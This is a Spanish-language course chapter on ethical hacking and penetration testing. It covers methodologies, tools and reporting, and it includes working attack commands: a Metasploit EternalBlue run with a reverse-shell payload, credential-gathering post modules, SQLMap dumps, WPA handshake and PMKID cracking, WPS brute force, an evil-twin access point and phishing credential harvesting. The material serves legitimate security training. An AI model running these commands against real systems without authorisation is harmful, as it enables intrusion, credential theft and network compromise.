# Tema 12: Ethical Hacking

## Índice de Contenidos
1. [Etapas del Ethical Hacking](#etapas-del-ethical-hacking)
2. [Conceptos Básicos del Ethical Hacking](#conceptos-básicos-del-ethical-hacking)
3. [Metodologías de Ethical Hacking](#metodologías-de-ethical-hacking)
4. [Herramientas del Ethical Hacker](#herramientas-del-ethical-hacker)
5. [Tipos de Penetration Testing](#tipos-de-penetration-testing)
6. [Web Application Security Testing](#web-application-security-testing)
7. [Network Penetration Testing](#network-penetration-testing)
8. [Wireless Security Testing](#wireless-security-testing)
9. [Social Engineering Testing](#social-engineering-testing)
10. [Reporting y Documentation](#reporting-y-documentation)

---

## Etapas del Ethical Hacking

### Definición de Ethical Hacking
El **Ethical Hacking** o **Hacking Ético** es el proceso de identificar vulnerabilidades en sistemas informáticos, redes y aplicaciones web de manera legal y autorizada, con el objetivo de mejorar la seguridad de la organización.

```
Diferencias Éticas:
┌─────────────────────┬─────────────────────────┐
│ Ethical Hacker      │ Malicious Hacker        │
├─────────────────────┼─────────────────────────┤
│ Autorización previa │ Sin autorización        │
│ Documentación       │ Ocultamiento            │
│ Objetivo: Proteger  │ Objetivo: Dañar         │
│ Respeta la ley      │ Actividades ilegales    │
│ Reporta hallazgos   │ Explota vulnerabilidades│
└─────────────────────┴─────────────────────────┘
```

### Fases del Proceso de Ethical Hacking

#### 1. Planificación y Preparación
**Actividades Clave:**
- Definición de alcance y objetivos
- Obtención de autorizaciones legales
- Establecimiento de reglas de engagement
- Preparación del entorno de testing
- Coordinación con stakeholders

**Documentos Requeridos:**
```
Documentación Legal:
├── Contrato de Penetration Testing
├── Acuerdo de Confidencialidad (NDA)
├── Autorización de Testing
├── Declaración de Alcance (SoW)
└── Política de Divulgación Responsable
```

#### 2. Information Gathering (Reconocimiento)
**Reconocimiento Pasivo:**
- Búsqueda en fuentes públicas (OSINT)
- Análisis de sitios web y redes sociales
- Consulta de registros DNS y WHOIS
- Búsqueda en motores especializados

**Reconocimiento Activo:**
- Escaneo de puertos y servicios
- Identificación de sistemas operativos
- Mapeo de red y topología
- Enumeración de servicios

#### 3. Vulnerability Assessment
**Identificación de Vulnerabilidades:**
```
Tipos de Vulnerabilidades:
├── Vulnerabilidades de Software
│   ├── Bugs conocidos (CVEs)
│   ├── Configuraciones incorrectas
│   ├── Versiones obsoletas
│   └── Parches faltantes
├── Vulnerabilidades de Red
│   ├── Protocolos inseguros
│   ├── Servicios innecesarios
│   ├── Configuraciones débiles
│   └── Arquitectura insegura
├── Vulnerabilidades Humanas
│   ├── Contraseñas débiles
│   ├── Falta de concienciación
│   ├── Procedimientos inadecuados
│   └── Ingeniería social
└── Vulnerabilidades Físicas
    ├── Acceso no controlado
    └── Falta de monitoreo
```

#### 4. Penetration Testing (Explotación)
**Técnicas de Explotación:**
- Explotación manual de vulnerabilidades
- Uso de exploits automatizados
- Escalamiento de privilegios
- Movimiento lateral en la red
- Persistencia en sistemas comprometidos

#### 5. Post-Assessment Activities
**Actividades de Limpieza:**
- Eliminación de backdoors creados
- Restauración de configuraciones
- Borrado de logs de actividades
- Verificación de integridad del sistema
- Notificación de finalización

#### 6. Reporting y Recomendaciones
**Estructura del Reporte:**
- Executive Summary para directivos
- Hallazgos técnicos detallados
- Evaluación de riesgos
- Recomendaciones de remediación
- Timeline de implementación

---

## Conceptos Básicos del Ethical Hacking

### Fundamentos Éticos y Legales

#### Marco Legal
**Legislación Aplicable:**
- Leyes de protección de datos personales
- Regulaciones de ciberseguridad sectorial
- Códigos penales sobre delitos informáticos
- Normativas internacionales (GDPR, SOX, PCI-DSS)

#### Principios Éticos Fundamentales
```
Código de Ética del Ethical Hacker:
├── Autorización Explícita
│   ├── Consentimiento escrito previo
│   ├── Límites claros de alcance
│   └── Aprobación de metodología
├── Confidencialidad
│   ├── Protección de información sensible
│   ├── No divulgación no autorizada
│   └── Manejo seguro de datos
├── Integridad
│   ├── Honestidad en reportes
│   ├── No modificación de datos
│   └── Objetividad en hallazgos
├── Responsabilidad
│   ├── Minimización de impacto
│   ├── Respeto por la privacidad
│   └── Uso responsable de herramientas
└── Mejora Continua
    ├── Actualización de conocimientos
    └── Compartir conocimiento (cuando apropiado)
```

### Diferencias entre Tipos de Hackers

#### Clasificación por Motivación
**White Hat Hackers (Hackers Éticos):**
- Motivación: Mejorar la seguridad
- Métodos: Legales y autorizados
- Objetivo: Proteger sistemas
- Relación: Colaborativa con organizaciones

**Black Hat Hackers (Hackers Maliciosos):**
- Motivación: Beneficio personal/daño
- Métodos: Ilegales y no autorizados
- Objetivo: Comprometer sistemas
- Relación: Adversarial con organizaciones

**Gray Hat Hackers:**
- Motivación: Mixta
- Métodos: A veces no autorizados
- Objetivo: Demostrar vulnerabilidades
- Relación: Ambigua

### Certificaciones en Ethical Hacking

#### Certificaciones Principales
```
Certificaciones de Ethical Hacking:
├── CEH (Certified Ethical Hacker)
│   ├── Vendor: EC-Council
│   ├── Enfoque: Generalista
│   ├── Duración: 4 horas, 125 preguntas
│   └── Renovación: 3 años
├── OSCP (Offensive Security Certified Professional)
│   ├── Vendor: Offensive Security
│   ├── Enfoque: Hands-on practical
│   ├── Duración: 24 horas lab + reporte
│   └── Validez: Lifetime
├── GPEN (GIAC Penetration Tester)
│   ├── Vendor: SANS/GIAC
│   ├── Enfoque: Penetration testing
│   ├── Duración: 3 horas
│   └── Renovación: 4 años
├── CPTE (Certified Penetration Testing Engineer)
│   ├── Vendor: Mile2
│   ├── Enfoque: Technical pentest
│   └── Hands-on component required
└── eJPT (eLearnSecurity Junior Penetration Tester)
    ├── Vendor: INE Security
    ├── Enfoque: Entry-level
    └── Practical exam format
```

---

## Metodologías de Ethical Hacking

### OWASP Testing Guide

#### Estructura del Framework
**OWASP Testing Guide v4.0:**
```
OWASP Testing Methodology:
├── Information Gathering
│   ├── Conduct Search Engine Discovery
│   ├── Fingerprint Web Server
│   ├── Review Webserver Metafiles
│   └── Enumerate Applications on Webserver
├── Configuration Testing
│   ├── Test Network/Infrastructure Configuration
│   ├── Test Application Platform Configuration
│   ├── Test File Extensions Handling
│   └── Review Old Files and Backup Files
├── Authentication Testing
│   ├── Test for Credentials Transport
│   ├── Test for Default Credentials
│   ├── Test for Weak Lock Out Mechanism
│   └── Test for Bypassing Authentication Schema
├── Session Management Testing
│   ├── Test for Session Management Schema
│   ├── Test for Cookies Attributes
│   ├── Test for Session Fixation
│   └── Test for CSRF
└── Input Validation Testing
    ├── Test for Reflected XSS
    ├── Test for SQL Injection
    └── Test for LDAP Injection
```

### PTES (Penetration Testing Execution Standard)

#### Fases del PTES
**1. Pre-engagement Interactions**
- Scoping del engagement
- Definición de reglas de engagement
- Configuración de entorno de testing

**2. Intelligence Gathering**
- OSINT (Open Source Intelligence)
- Footprinting y reconnaissance
- Social engineering reconnaissance

**3. Threat Modeling**
- Asset identification y valuation
- Threat agent identification
- Attack vector analysis

**4. Vulnerability Analysis**
- Vulnerability scanning
- Vulnerability validation
- Research de vulnerabilidades

**5. Exploitation**
- Precision strikes
- Strategic attacks
- Consistent methodology

**6. Post Exploitation**
- Infrastructure analysis
- Pillaging valuable information
- Cleanup activities

**7. Reporting**
- Executive summary
- Technical report
- Remediation recommendations

### NIST SP 800-115

#### Metodología NIST
```
NIST Testing Phases:
├── Planning Phase
│   ├── Define scope and objectives
│   ├── Understand target network architecture
│   ├── Identify personnel contacts
│   └── Develop timeline
├── Discovery Phase
│   ├── Network discovery
│   ├── Host discovery
│   ├── Service discovery
│   └── Operating system identification
├── Attack Phase
│   ├── Vulnerability analysis
│   ├── Initial access
│   ├── Privilege escalation
│   └── Network browsing
└── Reporting Phase
    ├── Cleanup activities
    └── Report generation
```

### CEH Methodology

#### Fases del CEH
**1. Reconnaissance**
- Passive information gathering
- Active information gathering
- Competitive intelligence

**2. Scanning**
- Pre-attack phase scanning
- Port scanning techniques
- Vulnerability scanning

**3. Enumeration**
- Service enumeration
- User enumeration
- Share enumeration

**4. System Hacking**
- Password cracking
- Privilege escalation
- Rootkits and backdoors

**5. Maintaining Access**
- Persistence techniques
- Covering tracks
- Evidence elimination

---

## Herramientas del Ethical Hacker

### Kali Linux Distribution

#### Características de Kali Linux
**Distribución Especializada:**
- Basada en Debian Linux
- Más de 600 herramientas de seguridad preinstaladas
- Actualizaciones regulares de herramientas
- Soporte para múltiples arquitecturas (x86, ARM)
- Live USB/DVD capability

#### Categorías de Herramientas en Kali
```
Herramientas por Categoría:
├── Information Gathering
│   ├── DNS Analysis (dnsrecon, fierce)
│   ├── IDS/IPS Identification (wafw00f)
│   ├── Live Host Identification (arping, fping)
│   ├── Network Scanners (nmap, masscan)
│   ├── OSINT Analysis (maltego, recon-ng)
│   ├── Route Analysis (netdiscover)
│   ├── SMB Analysis (enum4linux, nbtscan)
│   └── SNMP Analysis (snmpwalk, onesixtyone)
├── Vulnerability Analysis
│   ├── OpenVAS
│   ├── Nessus (commercial)
│   ├── Nikto web scanner
│   └── Unix-privesc-check
├── Web Application Analysis
│   ├── Burp Suite
│   ├── OWASP ZAP
│   ├── Nikto
│   ├── Skipfish
│   └── SQLMap
├── Database Assessment Tools
│   ├── SQLMap
│   ├── SQLNinja
│   └── NoSQL tools
├── Password Attacks
│   ├── Hashcat
│   ├── John the Ripper
│   ├── Hydra
│   ├── Medusa
│   └── Ncrack
├── Wireless Attacks
│   ├── Aircrack-ng suite
│   ├── Reaver
│   ├── Kismet
│   └── WiFite
├── Reverse Engineering
│   ├── OllyDbg
│   ├── IDA Free
│   ├── Radare2
│   └── GDB
├── Exploitation Tools
│   ├── Metasploit Framework
│   ├── Social Engineering Toolkit
│   ├── Commix
│   └── Exploit Database
└── Forensics Tools
    ├── Autopsy
    ├── Binwalk
    └── Foremost
```

### Metasploit Framework

#### Arquitectura de Metasploit
```
Metasploit Components:
├── MSFconsole (Interfaz principal)
├── Exploits (Código de explotación)
├── Payloads (Código ejecutado post-explotación)
├── Auxiliary (Módulos de utilidad)
├── Post-exploitation (Módulos post-explotación)
├── Encoders (Evasión de antivirus)
└── NOP generators (No-operation)
```

#### Uso Básico de Metasploit
**Comandos Fundamentales:**
```bash
# Iniciar MSFconsole
msfconsole

# Buscar exploits
search type:exploit platform:windows

# Seleccionar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Ver opciones requeridas
show options

# Configurar target
set RHOSTS 192.168.1.100

# Seleccionar payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Configurar LHOST
set LHOST 192.168.1.50

# Ejecutar exploit
exploit
```

### Burp Suite

#### Componentes de Burp Suite
**Herramientas Principales:**
- **Proxy**: Intercepción de tráfico HTTP/HTTPS
- **Scanner**: Detección automática de vulnerabilidades
- **Intruder**: Ataques automatizados y fuzzing
- **Repeater**: Modificación y reenvío de requests
- **Sequencer**: Análisis de tokens y sesiones
- **Decoder**: Codificación/decodificación de datos
- **Comparer**: Comparación de responses

#### Configuración Básica
```
Burp Suite Setup:
├── Configure Browser Proxy
│   ├── Set proxy to 127.0.0.1:8080
│   └── Install Burp CA certificate
├── Scope Configuration
│   ├── Define target scope
│   └── Exclude out-of-scope domains
├── Scanner Settings
│   ├── Passive scanning options
│   └── Active scanning configuration
└── Extensions
    ├── Install useful extensions
    └── Configure custom tools
```

### Nessus/OpenVAS

#### Nessus Vulnerability Scanner
**Características:**
- Más de 100,000 CVEs en base de datos
- Plugins actualizados regularmente
- Compliance auditing capabilities
- Reporting avanzado
- API para integración

#### OpenVAS (Open Source Alternative)
**Componentes de OpenVAS:**
- GSA (Greenbone Security Assistant) - Web Interface
- GVM (Greenbone Vulnerability Manager) - Core
- OSP (Open Scanner Protocol) - Communication
- NVT (Network Vulnerability Tests) - Tests database

---

## Tipos de Penetration Testing

### Clasificación por Conocimiento Previo

#### Black Box Testing
**Características:**
- Conocimiento cero sobre el sistema objetivo
- Simula un atacante externo real
- Enfoque en discovery y reconnaissance
- Tiempo de testing más extenso

**Ventajas:**
- Perspectiva realista de atacante
- Identifica vulnerabilidades obvias
- No requiere información privilegiada

**Desventajas:**
- Cobertura limitada
- Tiempo prolongado
- Puede pasar por alto vulnerabilidades internas

#### White Box Testing
**Características:**
- Acceso completo a información del sistema
- Código fuente, arquitectura, credenciales
- Testing exhaustivo y detallado
- Enfoque en code review y configuraciones

**Ventajas:**
- Cobertura máxima de testing
- Eficiencia en tiempo
- Identifica vulnerabilidades lógicas complejas

**Desventajas:**
- Perspectiva menos realista
- Requiere recursos especializados
- Posible bias por conocimiento previo

#### Gray Box Testing
**Características:**
```
Gray Box Testing Approach:
├── Información Parcial Disponible
│   ├── Arquitectura básica
│   ├── Credenciales limitadas
│   └── Documentación parcial
├── Simula Atacante Interno
│   ├── Empleado con acceso limitado
│   ├── Usuario autenticado
│   └── Partner de negocio
├── Balance entre Eficiencia y Realismo
│   ├── Mejor que black box en cobertura
│   ├── Más realista que white box
│   └── Tiempo de testing razonable
```

### Clasificación por Ubicación

#### External Penetration Testing
**Alcance:**
- Testing desde Internet público
- Infraestructura perimetral
- Aplicaciones web públicas
- DNS y servicios expuestos

**Objetivos:**
- Identificar puntos de entrada externos
- Evaluar defensas perimetrales
- Simular ataques desde Internet
- Validar controles de acceso externos

#### Internal Penetration Testing
**Alcance:**
- Testing desde red interna
- Sistemas y servicios internos
- Active Directory environments
- Segmentación de red interna

**Objetivos:**
- Evaluar seguridad interna
- Simular amenazas internas
- Identificar movimiento lateral
- Validar controles internos

### Tipos Especializados

#### Web Application Testing
**Áreas de Focus:**
```
Web App Testing Areas:
├── Authentication & Authorization
│   ├── Bypass mechanisms
│   ├── Session management flaws
│   └── Privilege escalation
├── Input Validation
│   ├── SQL injection
│   ├── XSS (Cross-site scripting)
│   ├── Command injection
│   └── File upload vulnerabilities
├── Business Logic Flaws
│   ├── Workflow bypasses
│   ├── Race conditions
│   └── Logic errors
├── Client-Side Security
│   ├── DOM-based XSS
│   ├── Client-side validation bypass
│   └── HTML5 security issues
└── API Security
    ├── REST API vulnerabilities
    ├── Authentication weaknesses
    └── Rate limiting issues
```

#### Mobile Application Testing
**Plataformas:**
- iOS Applications
- Android Applications
- Hybrid/Cross-platform apps
- Mobile web applications

**Metodologías:**
- OWASP Mobile Top 10
- Static analysis (SAST)
- Dynamic analysis (DAST)
- Interactive analysis (IAST)

#### Cloud Penetration Testing
**Áreas de Evaluación:**
```
Cloud Security Testing:
├── Configuration Assessment
│   ├── IAM policies
│   ├── Storage bucket permissions
│   ├── Network security groups
│   └── Encryption settings
├── Container Security
│   ├── Docker containers
│   ├── Kubernetes clusters
│   ├── Container registries
│   └── Runtime security
├── Serverless Security
│   ├── Function permissions
│   ├── Event triggers
│   └── Data flow security
└── Multi-tenancy Issues
    ├── Isolation failures
    └── Cross-tenant access
```

---

## Web Application Security Testing

### OWASP Top 10 Vulnerabilities (2021)

#### A01: Broken Access Control
**Descripción:**
- Restricciones incorrectas de acceso
- Usuarios pueden actuar fuera de permisos
- Escalamiento vertical u horizontal de privilegios

**Técnicas de Testing:**
```bash
# Path traversal testing
GET /app/accountInfo?acct=notmyacct

# Parameter manipulation
POST /transferFunds
amount=100&fromAccount=123&toAccount=456

# URL manipulation
GET /admin/deleteUser?userId=123
```

#### A02: Cryptographic Failures
**Categorías Principales:**
- Datos sensibles transmitidos en claro
- Algoritmos criptográficos débiles u obsoletos
- Generación y gestión inadecuada de claves
- Validación de certificados inexistente

#### A03: Injection
**Tipos de Injection:**
```
Injection Types:
├── SQL Injection
│   ├── Union-based
│   ├── Boolean-based blind
│   ├── Time-based blind
│   └── Error-based
├── NoSQL Injection
│   ├── MongoDB injection
│   ├── CouchDB injection
│   └── Cassandra injection
├── Command Injection
│   ├── OS command injection
│   ├── Code injection
│   └── Script injection
├── LDAP Injection
├── XPath Injection
└── Template Injection
```

**SQLMap Usage Example:**
```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page?id=1"

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
```

### Manual Testing Techniques

#### Authentication Testing
**Common Weaknesses:**
- Default credentials
- Weak password policies
- Inadequate account lockout
- Password reset vulnerabilities

**Testing Approach:**
```
Authentication Testing Steps:
├── Credential Verification
│   ├── Test default accounts
│   ├── Password complexity rules
│   ├── Account enumeration
│   └── Brute force protection
├── Session Management
│   ├── Session token analysis
│   ├── Session fixation
│   ├── Session timeout
│   └── Concurrent sessions
├── Password Recovery
│   ├── Recovery mechanism security
│   ├── Question predictability
│   └── Token validation
└── Multi-factor Authentication
    ├── MFA bypass attempts
    └── Token reuse attacks
```

#### Business Logic Testing
**Common Flaws:**
- Workflow bypasses
- Race condition vulnerabilities
- Data validation inconsistencies
- Economic logic flaws

### Automated Scanning Tools

#### OWASP ZAP (Zed Attack Proxy)
**Features:**
- Intercepting proxy
- Automated scanner
- Passive vulnerability detection
- API security testing

#### Nikto Web Scanner
**Capabilities:**
- Server configuration scanning
- Outdated software detection
- Dangerous files identification
- CGI vulnerability scanning

```bash
# Basic Nikto scan
nikto -h http://target.com

# Scan with specific plugins
nikto -h http://target.com -Plugins "@@ALL"

# Output to file
nikto -h http://target.com -o nikto_results.txt
```

---

## Network Penetration Testing

### Network Discovery and Mapping

#### Network Reconnaissance
**Passive Reconnaissance:**
- WHOIS lookups
- DNS enumeration
- Social media intelligence
- Search engine reconnaissance

**Active Reconnaissance:**
```bash
# Network discovery with Nmap
nmap -sn 192.168.1.0/24

# TCP SYN scan
nmap -sS -p 1-65535 target.com

# UDP scan on common ports
nmap -sU -p 53,67,68,69,123,135,137,138,139,161 target.com

# OS detection
nmap -O target.com

# Service version detection
nmap -sV target.com

# Aggressive scan
nmap -A target.com
```

### Port Scanning and Service Enumeration

#### Nmap Scanning Techniques
```
Nmap Scan Types:
├── TCP Scans
│   ├── -sS (SYN scan) - Stealth scan
│   ├── -sT (Connect scan) - Full connection
│   ├── -sA (ACK scan) - Firewall detection
│   ├── -sW (Window scan) - Window detection
│   └── -sF (FIN scan) - Firewall evasion
├── UDP Scans
│   └── -sU (UDP scan) - UDP port scanning
├── Other Scans
│   ├── -sN (Null scan) - No flags set
│   ├── -sX (Xmas scan) - All flags set
│   └── -sI (Idle scan) - Zombie scanning
└── Timing Templates
    ├── -T0 (Paranoid) - Very slow
    ├── -T1 (Sneaky) - Slow
    ├── -T3 (Normal) - Default
    ├── -T4 (Aggressive) - Fast
    └── -T5 (Insane) - Very fast
```

#### Service Enumeration Examples
**SMB Enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //target.com

# Connect to specific share
smbclient //target.com/share

# Enum4linux comprehensive enumeration
enum4linux -a target.com

# SMB vulnerability scanning
nmap --script smb-vuln-* target.com
```

**DNS Enumeration:**
```bash
# DNS zone transfer attempt
dig axfr @dns-server domain.com

# Subdomain enumeration
dnsrecon -d domain.com -t brt

# DNS brute force
fierce -dns domain.com
```

### Vulnerability Identification

#### Automated Vulnerability Scanning
**OpenVAS Scanning Process:**
1. Target configuration
2. Scan configuration selection
3. Vulnerability scan execution
4. Results analysis and prioritization
5. Report generation

**Nessus Professional:**
```
Nessus Scan Types:
├── Basic Network Scan
├── Advanced Scan (custom configuration)
├── Web Application Tests
├── Malware Scan
├── Mobile Device Scan
├── Compliance Audits
│   ├── PCI DSS
│   ├── CIS Benchmarks
│   ├── DISA STIG
│   └── Custom policies
└── Credentialed Scans
    ├── Windows (SMB)
    ├── Unix/Linux (SSH)
    └── Database credentials
```

### Exploitation Techniques

#### Common Network Attack Vectors
```
Network Exploitation Methods:
├── Service Exploitation
│   ├── Buffer overflow attacks
│   ├── Remote code execution
│   ├── Default credential exploitation
│   └── Configuration vulnerabilities
├── Protocol Attacks
│   ├── SMB relay attacks
│   ├── Kerberoasting
│   ├── LLMNR/NBT-NS poisoning
│   └── IPv6 attacks
├── Man-in-the-Middle
│   ├── ARP spoofing
│   ├── DNS spoofing
│   ├── SSL/TLS interception
│   └── Router advertisement attacks
└── Denial of Service
    ├── Resource exhaustion
    ├── Protocol abuse
    └── Amplification attacks
```

#### Metasploit for Network Exploitation
**Common Network Exploits:**
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# BlueKeep (CVE-2019-0708)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS target_range
run
```

### Post-Exploitation Activities

#### Information Gathering
**System Information Collection:**
```bash
# Meterpreter commands
sysinfo
getuid
ps
netstat
route

# Windows privilege escalation enumeration
run post/windows/gather/enum_services
run post/windows/gather/credentials/windows_autologin
run post/multi/recon/local_exploit_suggester

# Linux enumeration
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/checkvm
```

#### Privilege Escalation
**Common Techniques:**
- Kernel exploits
- Service misconfigurations
- Weak file permissions
- Scheduled task abuse
- Registry vulnerabilities (Windows)
- SUID binaries (Linux)

#### Lateral Movement
**Movement Techniques:**
```
Lateral Movement Methods:
├── Credential Harvesting
│   ├── Memory dumps (Mimikatz)
│   ├── Registry extraction
│   ├── Password files
│   └── Browser credentials
├── Pass-the-Hash/Token
│   ├── NTLM hash reuse
│   ├── Kerberos ticket abuse
│   └── Token impersonation
├── Remote Access Tools
│   ├── PsExec
│   ├── WMI
│   ├── PowerShell remoting
│   └── SSH key abuse
└── Persistence Mechanisms
    ├── Registry autorun keys
    ├── Scheduled tasks
    ├── Service installation
    └── DLL hijacking
```

---

## Wireless Security Testing

### WiFi Security Assessment

#### Wireless Reconnaissance
**Information Gathering:**
```bash
# Monitor mode setup
airmon-ng start wlan0

# Wireless network discovery
airodump-ng wlan0mon

# Specific target monitoring
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Access point information gathering
wash -i wlan0mon
```

#### Wireless Attack Vectors
```
WiFi Attack Categories:
├── WEP Attacks
│   ├── FMS attack
│   ├── Chopchop attack
│   ├── Fragmentation attack
│   └── Hirte attack
├── WPA/WPA2 Attacks
│   ├── Dictionary attacks
│   ├── Handshake capture and crack
│   ├── PMKID attack
│   └── WPS PIN attacks
├── WPA3 Attacks
│   ├── Dragonblood attacks
│   ├── Side-channel attacks
│   └── Implementation flaws
└── Enterprise WiFi Attacks
    ├── EAP method attacks
    ├── Certificate validation bypass
    └── RADIUS server attacks
```

### WPA/WPA2 Attack Techniques

#### 4-Way Handshake Capture
**Process Overview:**
```
WPA2 Handshake Capture:
1. Monitor target network
2. Capture 4-way handshake
3. Deauth clients to force reconnection
4. Crack captured handshake offline

Commands:
# Capture handshake
airodump-ng -c 6 --bssid TARGET_BSSID -w handshake wlan0mon

# Deauth attack to force handshake
aireplay-ng -0 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Crack with dictionary
aircrack-ng -w wordlist.txt handshake.cap

# Crack with Hashcat (faster)
hashcat -m 2500 handshake.hccapx wordlist.txt
```

#### PMKID Attack
**Technique Description:**
- Exploits weakness in WPA2 implementations
- Doesn't require client deauthentication
- Single packet capture sufficient
- Offline cracking possible

```bash
# PMKID capture with hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert for Hashcat
hcxpcaptool -z pmkid.txt pmkid.pcapng

# Crack with Hashcat
hashcat -m 16800 pmkid.txt wordlist.txt
```

### WPS Attacks

#### WPS PIN Brute Force
**Reaver Usage:**
```bash
# Basic WPS attack
reaver -i wlan0mon -b TARGET_BSSID -vv

# Attack with specific options
reaver -i wlan0mon -b TARGET_BSSID -c 6 -vv -d 2 -x 3

# Pixie dust attack (if vulnerable)
reaver -i wlan0mon -b TARGET_BSSID -K -vv
```

### Rogue Access Points

#### Evil Twin Setup
**Creating Fake AP:**
```bash
# Create fake access point
hostapd evil_twin.conf

# DHCP service for clients
dnsmasq -C dnsmasq.conf -d

# Captive portal setup
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Bluetooth Security Testing

#### Bluetooth Reconnaissance
```bash
# Bluetooth device discovery
hcitool scan

# Service discovery
sdptool browse TARGET_MAC

# L2CAP ping
l2ping TARGET_MAC

# RFCOMM channel scan
rfcomm
```

#### Common Bluetooth Attacks
- Bluejacking (unsolicited messages)
- Bluesnarfing (data theft)
- Bluebugging (device control)
- Car whisperer (hands-free exploitation)

---

## Social Engineering Testing

### Phishing Campaigns

#### Email Phishing Tests
**Campaign Development:**
```
Phishing Campaign Process:
├── Target Analysis
│   ├── Email address gathering
│   ├── Social media reconnaissance
│   ├── Organizational structure research
│   └── Communication patterns analysis
├── Pretext Development
│   ├── Scenario creation
│   ├── Urgency factors
│   ├── Authority impersonation
│   └── Credibility elements
├── Email Creation
│   ├── Subject line optimization
│   ├── Content development
│   ├── Visual design
│   └── Call-to-action definition
├── Infrastructure Setup
│   ├── Domain registration
│   ├── Email server configuration
│   ├── Landing page creation
│   └── Credential harvesting setup
└── Campaign Execution
    ├── Email delivery
    ├── Response monitoring
    ├── Victim interaction tracking
    └── Success rate analysis
```

#### Phishing Frameworks
**Gophish Framework:**
```
Gophish Features:
├── Campaign Management
│   ├── Target list management
│   ├── Email template creation
│   ├── Landing page design
│   └── Scheduling capabilities
├── Tracking and Analytics
│   ├── Open rate tracking
│   ├── Click-through rates
│   ├── Credential submission
│   └── Real-time dashboard
├── Reporting
│   ├── Individual results
│   ├── Campaign summaries
│   └── Timeline analysis
└── Security Features
    ├── HTTPS support
    ├── User authentication
    └── Database encryption
```

**Social Engineer Toolkit (SET):**
```bash
# Launch SET
setoolkit

# Spear-phishing attack vectors
1) Social-Engineering Attacks
   1) Spear-Phishing Attack Vectors
      1) Perform a Mass Email Attack
      2) Create a FileFormat Payload
      3) Create a Social-Engineering Template
```

### Physical Security Testing

#### Physical Access Attempts
**Common Techniques:**
- Tailgating (following authorized personnel)
- Badge cloning and RFID attacks
- Lock picking and bump keys
- Social engineering guards/receptionists
- Impersonation of service personnel

#### Physical Red Team Operations
```
Physical Security Assessment:
├── Reconnaissance Phase
│   ├── Building layout analysis
│   ├── Security camera placement
│   ├── Access control systems
│   ├── Guard schedules observation
│   └── Employee behavior patterns
├── Access Attempts
│   ├── Main entrance approaches
│   ├── Secondary entrance testing
│   ├── Loading dock access
│   ├── Emergency exit abuse
│   └── Roof/basement access
├── Internal Movement
│   ├── Badge cloning attempts
│   ├── Elevator access testing
│   ├── Restricted area penetration
│   └── Server room access
└── Information Gathering
    ├── Document photography
    ├── Network port access
    ├── Workstation analysis
    └── Physical asset inventory
```

### Pretext Calling (Vishing)

#### Voice-based Social Engineering
**Common Pretexts:**
- IT support impersonation
- Survey/research calls
- Vendor/supplier impersonation
- Emergency scenarios
- Authority figure impersonation

**Information Gathering Goals:**
```
Vishing Objectives:
├── Credential Harvesting
│   ├── Username/password collection
│   ├── Personal information gathering
│   ├── Security question answers
│   └── Multi-factor authentication bypass
├── Technical Information
│   ├── System configurations
│   ├── Network topology details
│   ├── Software versions
│   └── Security control information
├── Organizational Intelligence
│   ├── Employee directory information
│   ├── Organizational structure
│   ├── Process and procedure details
│   └── Project information
└── Physical Security Details
    ├── Building access procedures
    ├── Visitor management processes
    └── Security control locations
```

### USB Drop Attacks

#### USB-based Attack Vectors
**Payload Types:**
```
USB Attack Payloads:
├── Rubber Ducky Scripts
│   ├── Credential harvesting
│   ├── Reverse shell deployment
│   ├── Data exfiltration
│   └── Persistence establishment
├── BadUSB Attacks
│   ├── HID keyboard emulation
│   ├── Mass storage device abuse
│   └── Network adapter spoofing
├── Malware Delivery
│   ├── Executable payload delivery
│   ├── Document-based exploits
│   └── Autorun abuse
└── Social Engineering
    ├── Curiosity exploitation
    ├── Authority impersonation
    └── Urgency creation
```

---

## Reporting y Documentation

### Executive Summary Development

#### Target Audience Considerations
**C-Level Executive Report:**
- Business impact focus
- Risk quantification in financial terms
- Strategic recommendations
- Regulatory compliance implications
- Minimal technical details

**Technical Team Report:**
- Detailed vulnerability descriptions
- Exploitation procedures
- Technical remediation steps
- Architecture recommendations
- Tool configurations

### Report Structure Framework

#### Standard Report Sections
```
Penetration Testing Report Structure:
├── Executive Summary
│   ├── Assessment Overview
│   ├── Key Findings Summary
│   ├── Risk Rating Distribution
│   ├── Business Impact Analysis
│   └── Strategic Recommendations
├── Assessment Overview
│   ├── Scope Definition
│   ├── Methodology Used
│   ├── Timeline and Duration
│   ├── Limitations and Assumptions
│   └── Testing Team Information
├── Technical Findings
│   ├── Vulnerability Details
│   ├── Risk Rating Justification
│   ├── Evidence Documentation
│   ├── Exploitation Proof
│   └── Business Impact Analysis
├── Risk Assessment
│   ├── Risk Rating Methodology
│   ├── Vulnerability Prioritization
│   ├── Attack Vector Analysis
│   └── Likelihood vs Impact Matrix
├── Remediation Recommendations
│   ├── Immediate Actions Required
│   ├── Short-term Improvements
│   ├── Long-term Strategic Changes
│   ├── Cost-benefit Analysis
│   └── Implementation Timeline
└── Appendices
    ├── Detailed Technical Evidence
    ├── Tool Output and Screenshots
    ├── Methodology References
    └── Glossary of Terms
```

### Risk Assessment and Prioritization

#### CVSS Scoring Integration
**Common Vulnerability Scoring System:**
```
CVSS v3.1 Base Score Calculation:
├── Exploitability Metrics
│   ├── Attack Vector (AV)
│   ├── Attack Complexity (AC)
│   ├── Privileges Required (PR)
│   └── User Interaction (UI)
├── Impact Metrics
│   ├── Confidentiality Impact (C)
│   ├── Integrity Impact (I)
│   └── Availability Impact (A)
└── Score Interpretation
    ├── 0.0: None
    ├── 0.1-3.9: Low
    ├── 4.0-6.9: Medium
    ├── 7.0-8.9: High
    └── 9.0-10.0: Critical
```

#### Custom Risk Rating Matrix
```
Risk Matrix (Likelihood vs Impact):
                Impact
           Low  Medium  High  Critical
